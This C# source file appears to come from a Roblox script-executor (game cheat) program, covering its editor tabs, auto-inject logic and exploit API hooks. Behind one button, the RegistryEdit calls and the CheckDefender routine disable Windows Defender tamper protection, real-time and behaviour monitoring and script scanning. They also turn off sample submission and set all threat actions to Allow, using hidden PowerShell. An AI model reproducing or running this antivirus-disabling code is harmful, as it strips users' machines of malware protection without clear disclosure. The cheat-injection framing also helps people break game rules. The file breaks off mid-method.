using ScintillaNET;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Threading;
using System.Windows.Documents;

namespace Test
{
    public partial class Form2 : Form
    {
        public string rootdir = Directory.GetParent(Directory.GetCurrentDirectory()).ToString();

        public Form2()
        {
            shub fo = new shub(this);
            this.fo = fo;
            
            InitializeComponent();
        }

        private void siticoneButton9_Click(object sender, EventArgs e)
        {
            this.Width = 518;
            panel2.Hide();
            panel5.Hide();
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        { 
            if (panel5.Visible || panel2.Visible)
            {
                this.Width = 518;
                panel5.Visible = false;
                panel2.Visible = false;
            }
            else
            {
                this.Width = 778;
                panel2.Visible = true;
                panel5.Visible = true;
            }
        }

        public async void msg(string a, bool panel = false)
        {
            if(panel)
            {
                string f = flatLabel2.Text;
                flatLabel2.Text += a;
                await Task.Delay(1000);
                flatLabel2.Text = f;
                return;
            }
            flatTextBox1.Text += (DateTime.Now.ToString("hh:mm:ss") + "  " + a + "\r\n");
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {

                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(regPath, Microsoft.Win32.RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Microsoft.Win32.Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, Microsoft.Win32.RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, Microsoft.Win32.RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }
        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;
            textBox.BackColor = Color.FromArgb(35, 35, 35);
            textBox.ForeColor = Color.White;
            form.FormBorderStyle = FormBorderStyle.None;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;
            buttonOk.BackColor = Color.FromArgb(45, 45, 45);
            buttonOk.ForeColor= Color.White;
            buttonCancel.BackColor = Color.FromArgb(45, 45, 45);
            buttonCancel.ForeColor = Color.White;
            buttonOk.FlatStyle= FlatStyle.Flat;
            buttonCancel.FlatStyle= FlatStyle.Flat;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            textBox.BorderStyle = BorderStyle.None;
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;
            form.FormBorderStyle = FormBorderStyle.None;
            form.BackColor = Color.FromArgb(45, 45, 45);

            label.ForeColor = Color.White;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }

        public void Form2_Load(object sender, EventArgs e)
        {
            listBox2.Items.Clear();

            comboBox1.SelectedIndex = 2;

            reToolStripMenuItem.PerformClick();
            siticoneButton11.PerformClick();
            
            siticoneCheckBox4.Checked = Properties.Settings.Default.UnlockFPS;
            siticoneCheckBox3.Checked = Properties.Settings.Default.AutoInject;
            siticoneCheckBox5.Checked = Properties.Settings.Default.InternalUI;
            siticoneCheckBox1.Checked = Properties.Settings.Default.TopMost;
            siticoneComboBox1.SelectedIndex = Properties.Settings.Default.API;
            this.Size = new Size(517, 281);
            msg("ui Loaded! Join our discord plz");



            rainbow(siticoneCheckBox2);
            rainbow(flatLabel2);

        }

        private async void rainbow(Control a, bool threading = false)
        {
            var random = new Random();
            while (threading)
            {
                a.ForeColor = Color.FromArgb(random.Next(1,250), random.Next(1, 250), random.Next(1, 250));
                await Task.Delay(100);
            }
            var thread = new Thread(() => rainbow(a, true));
            thread.Start();
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            try
            {
                if (tabControl1.TabPages.Count > 0)
                {
                    WriteText("");
                }
            }
            catch { }
        }

        private void panel3_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }
        Point lastPoint;

        private void panel3_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog1 = new OpenFileDialog();
                openFileDialog1.Filter = "Text (*.txt)|*.txt|Lua (*.lua)|*.lua|All Files (*.*)|*.*";
                if (openFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    WriteText(File.ReadAllText(openFileDialog1.FileName));
                }
            }
            catch { }

        }

        private void siticoneButton4_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                try
                {
                    if (tabControl1.TabPages.Count > 0)
                    {
                        SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                        saveFileDialog.InitialDirectory = Path.GetDirectoryName(Application.ExecutablePath) + "\\Scripts";
                        saveFileDialog.Filter = "Text (*.txt)|*.txt|Lua (*.lua)|*.lua|All Files (*.*)|*.*";
                        saveFileDialog1.FileName = tabControl1.SelectedTab.Text.TrimEnd(new char[] { ' ' });
                        saveFileDialog.FilterIndex = 1;
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.CreateNew))
                            using (StreamWriter sw = new StreamWriter(s))
                            {

                                
                                sw.Write(ReadText());
                            }
                        }
                    }
                }
                catch { }
            }
        }

        private void siticoneButton7_Click(object sender, EventArgs e)
        {
            
            Application.Exit();
        }

        private void siticoneButton8_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            
            Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
            if (processes.Length != 0 && this.siticoneCheckBox3.Checked)
            {
                siticoneButton6.PerformClick();
            }
        }
        private WebClient client = new WebClient();

        public void siticoneButton6_Click(object sender, EventArgs e)
        {
             

            Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
            if (processes.Length == 0)
            {
                //MessageBox.Show("Roblox process not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                msg("Roblox process not found!");
                return;
            }
            
                switch(siticoneComboBox1.SelectedIndex)
                {
                    case 0:
                        
                        
                        break;
                    case 1:
                        
                        
                    
                        break;
                    case 2:
                        
                        break;
                    case 3:
                        
                        break;
                    case 4:
                        break;
            
            }
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            if (tabControl1.TabPages.Count <= 0)
            {
                return;
            }
            try
            {
                exec(ReadText());
            }
            catch { }
        }

        public void exec(string script)
        {
            if (script == string.Empty)
            {
                return;
            }
            switch (siticoneComboBox1.SelectedIndex)
            {
                case 0:
                    //EasyExploits.Module Ex = new EasyExploits.Module();

                    break;
                case 1:
                    //WeAreDevs_API.ExploitAPI WRD_API = new WeAreDevs_API.ExploitAPI();


                    break;
                case 2:
                    //KrnlAPI.KrnlApi KRNL_API = new KrnlAPI.KrnlApi();

                    break;
                case 3:
                    break;
                case 4:
                    break;
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ComboBox a = sender as ComboBox;
            if (comboBox1.SelectedIndex == 2)
            {
                exec(File.ReadAllText($"./Scripts/{listBox1.SelectedItem}"));
            }
            if (comboBox1.SelectedIndex == 0)
            {
                exec(File.ReadAllText($"./autoexec/{listBox1.SelectedItem}"));
            }
            if (comboBox1.SelectedIndex == 1)
            {
                try
                {
                    exec(File.ReadAllText($"./workspace/{listBox1.SelectedItem}"));
                }
                catch
                {
                    //MessageBox.Show("unable to execute selected file. check again LOL", "ERROR");
                    msg("unable to execute selected file. check again LOL");
                }

            }
            if (comboBox1.SelectedIndex == 3)
            {
                try
                {

                }
                catch
                {

                }

            }
        }

        private void loadEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null)
            {
                try
                {

                    if (tabControl1.TabPages.Count > 0)
                    {
                        ComboBox a = sender as ComboBox;
                        if (comboBox1.SelectedIndex == 2)
                        {
                            WriteText(File.ReadAllText($"./Scripts/{listBox1.SelectedItem}"));
                        }
                        if (comboBox1.SelectedIndex == 0)
                        {
                            WriteText(File.ReadAllText($"./autoexec/{listBox1.SelectedItem}"));
                        }
                        if (comboBox1.SelectedIndex == 1)
                        {
                            WriteText(File.ReadAllText($"./workspace/{listBox1.SelectedItem}"));
                        }
                    }
                    if (comboBox1.SelectedIndex == 3)
                    {

                    }
                }
                catch { }



            }


        }

        private void reToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!(res_))
            {
                maskedTextBox1.Text = string.Empty;
            }
            if (comboBox1.SelectedIndex != 3)
            {
                listBox1.Items.Clear();
            }
            ComboBox a = sender as ComboBox;

            if (comboBox1.SelectedIndex == 2)
            {
                Functions.PopulateListBox(listBox1, "./scripts", "*.txt");
                Functions.PopulateListBox(listBox1, "./scripts", "*.lua");
            }
            if (comboBox1.SelectedIndex == 0)
            {
                Functions.PopulateListBox(listBox1, "./autoexec", "*.txt");
                Functions.PopulateListBox(listBox1, "./autoexec", "*.lua");
            }
            if (comboBox1.SelectedIndex == 1)
            {
                Functions.PopulateListBox(listBox1, "./workspace", "*");
            }

        }

        private void siticoneButton11_Click(object sender, EventArgs e)
        {
            /*
            TabPage newTab = tabControl1.TabPages[0];
            var newTab = new formTab();
            newTab.Controls.Add(newTab);
            */

            TabPage newTab1 = new TabPage();
            newTab1.Name = "script" + (tabControl1.TabCount + 1);
            newTab1.Text = "script" + (tabControl1.TabCount + 1 + "  ");
            newTab1.Parent = tabControl1;
            switch (siticoneComboBox2.SelectedIndex)
            {
                case 0:
                    createScin(newTab1);
                    break;
                case 1:
                    createMonaco(newTab1); break;
            }
            tabControl1.SelectTab(newTab1);
        }
        private void WriteText(string script)
        {
            switch(siticoneComboBox2.SelectedIndex)
            {
                case 0:
                    try
                    {
                        ScintillaNET.Scintilla textBox = this.tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as ScintillaNET.Scintilla;
                        textBox.Text = script;
                    }
                    catch { }
                    
                    break;
                case 1:
                    try
                    {
                        System.Windows.Forms.WebBrowser textBox = tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as System.Windows.Forms.WebBrowser;
                        textBox.Document.InvokeScript("SetText", new object[] { script });
                    }
                    catch { }
                    
                    break;
            }
        }

        private string ReadText()
        {
            switch (siticoneComboBox2.SelectedIndex)
            {
                case 0:
                    try
                    {
                        ScintillaNET.Scintilla textBox = this.tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as ScintillaNET.Scintilla;
                        return textBox.Text;
                    }
                    catch { }

                    break;
                case 1:
                    try
                    {
                        System.Windows.Forms.WebBrowser textBox = tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as System.Windows.Forms.WebBrowser;
                        HtmlDocument document = textBox.Document;
                        string scriptName = "GetText";
                        object[] args = new string[0];
                        object obj = document.InvokeScript(scriptName, args);
                        string script = obj.ToString();
                        return script;
                    }
                    catch { }

                    break;
            }
            return string.Empty;
        }


        private async void createMonaco(Control newTab)
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            try
            {
                Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
                string friendlyName = AppDomain.CurrentDomain.FriendlyName;
                bool flag2 = registryKey.GetValue(friendlyName) == null;
                if (flag2)
                {
                    registryKey.SetValue(friendlyName, 11001, Microsoft.Win32.RegistryValueKind.DWord);
                }
                registryKey = null;
                friendlyName = null;
            }
            catch (Exception)
            {
            }

            System.Windows.Forms.WebBrowser textBox = new System.Windows.Forms.WebBrowser();
            textBox.Parent = newTab;
            textBox.Dock = DockStyle.Fill;
            textBox.Name = "Scintilla1";
            textBox.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", Directory.GetCurrentDirectory()));
            await Task.Delay(500);
            string defPath = Application.StartupPath + "//Monaco//";
            textBox.Document.InvokeScript("SetTheme", new string[] {"Dark"});
            foreach (string text in File.ReadLines(defPath + "//base.txt"))
            {
                this.addIntel(text, "Keyword", text, text);
            }
            foreach (string text in File.ReadLines(defPath + "//classfunc.txt"))
            {
                this.addIntel(text, "Method", text, text);
            }
            foreach (string text in File.ReadLines(defPath + "//globalns.txt"))
            {
                this.addIntel(text, "Class", text, text);
            }
            foreach (string text in File.ReadLines(defPath + "//globalv.txt"))
            {
                this.addIntel(text, "Variable", text, text);
            }
            string[] array = File.ReadAllLines(defPath + "//globalf.txt");
            foreach (string text in array)
            {
                bool flag = text.Contains(':');
                if (flag)
                {
                    this.addIntel(text, "Function", text, text.Substring(1));
                }
                else
                {
                    this.addIntel(text, "Function", text, text);
                }
            }
            textBox.Document.InvokeScript("SetText", new object[]
            {""});

        }
        private void addIntel(string label, string kind, string detail, string insertText)
        {
            string text = "\"" + label + "\"";
            string text2 = "\"" + kind + "\"";
            string text3 = "\"" + detail + "\"";
            string text4 = "\"" + insertText + "\"";
            System.Windows.Forms.WebBrowser textBox = tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as System.Windows.Forms.WebBrowser;
            if (textBox != null)
            {
                textBox.Document.InvokeScript("AddIntellisense", new object[]
                {
                    label,
                    kind,
                    detail,
                    insertText
                });
            }
            else
            {
                siticoneComboBox2.SelectedIndex= 0;
            }
        }



        private void createScin(Control newTab)
        {
            ScintillaNET.Scintilla textBox = new ScintillaNET.Scintilla();
            textBox.Dock = DockStyle.Fill;
            textBox.Name = "Scintilla1";
            textBox.Parent = newTab;

            Scintilla scintilla = textBox;
            foreach (Style style in scintilla.Styles)
            {

                textBox.AllowDrop = true;
                textBox.AutomaticFold = (AutomaticFold.Show | AutomaticFold.Click | AutomaticFold.Change);
                textBox.BackColor = Color.Black;
                textBox.BorderStyle = BorderStyle.None;
                textBox.Lexer = Lexer.Lua;

                textBox.ScrollWidth = 1;
                textBox.TabIndex = 0;
                textBox.Styles[32].Size = 15;
                textBox.Styles[32].Size = 15;
                textBox.Styles[32].Size = 15;
                textBox.SetSelectionBackColor(true, Color.FromArgb(17, 177, 255));
                textBox.SetSelectionForeColor(true, Color.Black);
                textBox.Margins[1].Width = 0;
                textBox.StyleResetDefault();
                textBox.Styles[32].Font = "Consolas";
                textBox.Styles[32].Size = 10;
                textBox.Styles[32].BackColor = Color.FromArgb(34, 34, 34);
                textBox.Styles[32].ForeColor = Color.White;
                textBox.StyleClearAll();
                textBox.Styles[11].ForeColor = Color.White;
                textBox.Styles[1].ForeColor = Color.FromArgb(79, 81, 98);
                textBox.Styles[2].ForeColor = Color.FromArgb(79, 81, 98);
                textBox.Styles[3].ForeColor = Color.FromArgb(58, 64, 34);
                textBox.Styles[4].ForeColor = Color.FromArgb(165, 112, 255);
                textBox.Styles[6].ForeColor = Color.FromArgb(255, 192, 115);
                textBox.Styles[7].ForeColor = Color.FromArgb(255, 192, 115);
                textBox.Styles[8].ForeColor = Color.FromArgb(255, 192, 115);
                textBox.Styles[9].ForeColor = Color.FromArgb(138, 175, 238);
                textBox.Styles[10].ForeColor = Color.White;
                textBox.Styles[5].ForeColor = Color.FromArgb(255, 60, 122);
                textBox.Styles[13].ForeColor = Color.FromArgb(89, 255, 172);
                textBox.Styles[13].Bold = true;
                textBox.Styles[14].ForeColor = Color.FromArgb(89, 255, 172);
                textBox.Styles[14].Bold = true;
                textBox.Lexer = Lexer.Lua;
                textBox.SetProperty("fold", "1");
                textBox.SetProperty("fold.compact", "1");
                textBox.Margins[0].Width = 15;
                textBox.Margins[0].Type = MarginType.Number;
                textBox.Margins[1].Type = MarginType.Symbol;
                textBox.Margins[1].Mask = 4261412864U;
                textBox.Margins[1].Sensitive = true;
                textBox.Margins[1].Width = 8;
                for (int i = 25; i <= 31; i++)
                {
                    textBox.Markers[i].SetForeColor(Color.White);
                    textBox.Markers[i].SetBackColor(Color.White);
                }
                textBox.Markers[30].Symbol = MarkerSymbol.BoxPlus;
                textBox.Markers[31].Symbol = MarkerSymbol.BoxMinus;
                textBox.Markers[25].Symbol = MarkerSymbol.BoxPlusConnected;
                textBox.Markers[27].Symbol = MarkerSymbol.TCorner;
                textBox.Markers[26].Symbol = MarkerSymbol.BoxMinusConnected;
                textBox.Markers[29].Symbol = MarkerSymbol.VLine;
                textBox.Markers[28].Symbol = MarkerSymbol.LCorner;
                textBox.Styles[33].BackColor = Color.FromArgb(40, 40, 40);
                textBox.AutomaticFold = (AutomaticFold.Show | AutomaticFold.Click | AutomaticFold.Change);
                textBox.SetFoldMarginColor(true, Color.FromArgb(40, 40, 40));
                textBox.SetFoldMarginHighlightColor(true, Color.FromArgb(40, 40, 40));
                textBox.SetKeywords(0, "and break do else elseif end false for function if in local nil not or repeat return then true until while");
                textBox.SetKeywords(1, "warn CFrame CFrame.fromEulerAnglesXYZ Synapse Decompile Synapse Copy Synapse Write CFrame.Angles CFrame.fromAxisAngle CFrame.new gcinfo os os.difftime os.time tick UDim UDim.new Instance Instance.Lock Instance.Unlock Instance.new pairs NumberSequence NumberSequence.new assert tonumber getmetatable Color3 Color3.fromHSV Color3.toHSV Color3.fromRGB Color3.new load Stats _G UserSettings Ray Ray.new coroutine coroutine.resume coroutine.yield coroutine.status coroutine.wrap coroutine.create coroutine.running NumberRange NumberRange.new PhysicalProperties Physicalnew printidentity PluginManager loadstring NumberSequenceKeypoint NumberSequenceKeypoint.new Version Vector2 Vector2.new wait game. game.Players game.ReplicatedStorage Game delay spawn string string.sub string.upper string.len string.gfind string.rep string.find string.match string.char string.dump string.gmatch string.reverse string.byte string.format string.gsub string.lower CellId CellId.new Delay version stats typeof UDim2 UDim2.new table table.setn table.insert table.getn table.foreachi table.maxn table.foreach table.concat table.sort table.remove settings LoadLibrary require Vector3 Vector3.FromNormalId Vector3.FromAxis Vector3.new Vector3int16 Vector3int16.new setmetatable next ypcall ipairs Wait rawequal Region3int16 Region3int16.new collectgarbage game newproxy Spawn elapsedTime Region3 Region3.new time xpcall shared rawset tostring print Workspace Vector2int16 Vector2int16.new workspace unpack math math.log math.noise math.acos math.huge math.ldexp math.pi math.cos math.tanh math.pow math.deg math.tan math.cosh math.sinh math.random math.randomseed math.frexp math.ceil math.floor math.rad math.abs math.sqrt math.modf math.asin math.min math.max math.fmod math.log10 math.atan2 math.exp math.sin math.atan ColorSequenceKeypoint ColorSequenceKeypoint.new pcall getfenv ColorSequence ColorSequence.new type ElapsedTime select Faces Faces.new rawget debug debug.traceback debug.profileend debug.profilebegin Rect Rect.new BrickColor BrickColor.Blue BrickColor.White BrickColor.Yellow BrickColor.Red BrickColor.Gray BrickColor.palette BrickColor.New BrickColor.Black BrickColor.Green BrickColor.Random BrickColor.DarkGray BrickColor.random BrickColor.new setfenv dofile Axes Axes.new error loadfile ");
                textBox.SetKeywords(2, "kl_sex getrawmetatable loadstring getnamecallmethod setreadonly islclosure getgenv unlockModule lockModule mousemoverel debug.getupvalue debug.getupvalues debug.setupvalue debug.getmetatable debug.getregistry setclipboard setthreadcontext getthreadcontext checkcaller getgc debug.getconstant getrenv getreg ");
                textBox.ScrollWidth = 1;
                textBox.ScrollWidthTracking = true;
                textBox.CaretForeColor = Color.White;
                textBox.BackColor = Color.White;
                textBox.BorderStyle = BorderStyle.None;
                textBox.WrapIndentMode = WrapIndentMode.Indent;
                textBox.WrapVisualFlagLocation = WrapVisualFlagLocation.EndByText;
                textBox.BorderStyle = BorderStyle.None;


            }
        }

        private void siticoneButton12_Click(object sender, EventArgs e)
        {

        }
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.TopMost = false;
            string value = tabControl1.SelectedTab.Text.TrimEnd(' ');
            if (InputBox("rename tab", "tab name :", ref value) == DialogResult.OK)
            {
                tabControl1.SelectedTab.Text = value + "  ";
            }
            this.TopMost = true;
        }


        private void siticoneButton10_Click(object sender, EventArgs e)
        {
            new Mutex(true, "ROBLOX_singletonMutex");
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (comboBox1.SelectedIndex == 0)
                {
                    File.Delete($"./autoexec/{listBox1.SelectedItem}");
                }
                if (comboBox1.SelectedIndex == 1)
                {
                    File.Delete($"./workspace/{listBox1.SelectedItem}");
                }
                if (comboBox1.SelectedIndex == 2)
                {
                    File.Delete($"./Scripts/{listBox1.SelectedItem}");
                }
                if (comboBox1.SelectedIndex == 3)
                {
                    //savings here
                }
            }
            catch { }


        }


        private void siticoneButton22_Click(object sender, EventArgs e)
        {
            this.Height = 281;
            panel6.Hide();
        }

        private void siticoneButton15_Click(object sender, EventArgs e)
        {
            if (panel6.Visible)
            {
                this.Height = 281;
                panel6.Hide();
            }
            else
            {
                this.Height = 460;
                panel6.Show();
            }
        }

        private void siticoneCheckBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (siticoneCheckBox1.Checked)
            {
                this.TopMost = true;
            }
            else
            {
                this.TopMost = false;
            }
            fo.TopMost = this.TopMost;
            Properties.Settings.Default.TopMost = siticoneCheckBox1.Checked;
        }

        private void siticoneCheckBox4_CheckedChanged_1(object sender, EventArgs e)
        {
            if (siticoneCheckBox4.Checked)
            {
                Process.Start(Environment.CurrentDirectory + @"\rbxfpsunlocker.exe");
            }
            else
            {
                foreach (Process Unlocker in Process.GetProcesses())
                {
                    if (Unlocker.ProcessName.Contains("unlock") || Unlocker.MainWindowTitle.Contains("fps"))
                    {
                        Unlocker.Kill();
                    }
                }
            }
            Properties.Settings.Default.UnlockFPS = siticoneCheckBox4.Checked;
        }

        private void siticoneCheckBox3_CheckedChanged_1(object sender, EventArgs e)
        {
            Properties.Settings.Default.AutoInject = siticoneCheckBox3.Checked;
        }

        private void siticoneCheckBox5_CheckedChanged_1(object sender, EventArgs e)
        {
            Properties.Settings.Default.InternalUI = siticoneCheckBox5.Checked;
        }
        public string keysite;

        private void siticoneButton13_Click_1(object sender, EventArgs e)
        {
            foreach (Process processes in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                processes.Kill();
            }
        }

        private void siticoneButton14_Click(object sender, EventArgs e)
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private void siticoneGradientButton1_Click(object sender, EventArgs e)
        {
            panel9.VerticalScroll.Value = offset1;
            panel9.VerticalScroll.Value = offset1;
        }
        private int offset1 = 0;
        private int offset2 = 230;
        private int offset3 = 85;
        private int offset4 = 190;
        private void siticoneGradientButton2_Click(object sender, EventArgs e)
        {
            panel9.VerticalScroll.Value = offset1 + offset2;
            panel9.VerticalScroll.Value = offset1 + offset2;
        }

        private void siticoneGradientButton3_Click(object sender, EventArgs e)
        {
            panel9.VerticalScroll.Value = offset1 + offset2 + offset3;
            panel9.VerticalScroll.Value = offset1 + offset2 + offset3;
        }

        private void siticoneGradientButton5_Click(object sender, EventArgs e)
        {
            panel9.VerticalScroll.Value = offset1 + offset2 + offset3 + offset4;
            panel9.VerticalScroll.Value = offset1 + offset2 + offset3 + offset4;
        }
        private void siticoneButton25_Click(object sender, EventArgs e)
        {
            menuStrip1.Show();
            menuStrip1.BringToFront();
            
            
            
            switch(siticoneComboBox2.SelectedIndex)
            {
                case 0:
                    try
                    {
ScintillaNET.Scintilla textBox = this.tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as ScintillaNET.Scintilla;
                        textBox.Parent = this;
                        textBox.BringToFront();
                        textBox.Dock = DockStyle.Fill;
                        textBox.Size = new Size();
                    }
                    catch { }
                    
                    break; 
                case 1:
                    try
                    {
System.Windows.Forms.WebBrowser textBox = tabControl1.SelectedTab.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as System.Windows.Forms.WebBrowser;
                        textBox.Parent = this;
                        textBox.BringToFront();
                        textBox.Dock = DockStyle.Fill;
                        textBox.Size = new Size();
                    }
                    catch { }
                    
                    break;
            }

            
            this.WindowState = FormWindowState.Maximized;
        }

        private void toolStripTextBox1_Click(object sender, EventArgs e)
        {
            switch (siticoneComboBox2.SelectedIndex)
            {
                case 0:
                    try
                    {
                        ScintillaNET.Scintilla textBox = this.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as ScintillaNET.Scintilla;
                        textBox.Parent = tabControl1.SelectedTab;
                    }
                    catch { }

                    break;
                case 1:
                    try
                    {
                        System.Windows.Forms.WebBrowser textBox = this.Controls.Find("Scintilla1", true).FirstOrDefault<Control>() as System.Windows.Forms.WebBrowser;
                        textBox.Parent = tabControl1.SelectedTab;
                    }
                    catch { }

                    break;
            }
            


            menuStrip1.Hide();
            this.WindowState = FormWindowState.Normal;
        }

        private void flatTextBox2_Enter(object sender, EventArgs e)
        {
            if (flatTextBox2.Text == "Game id")
            {
                flatTextBox2.Text = "";
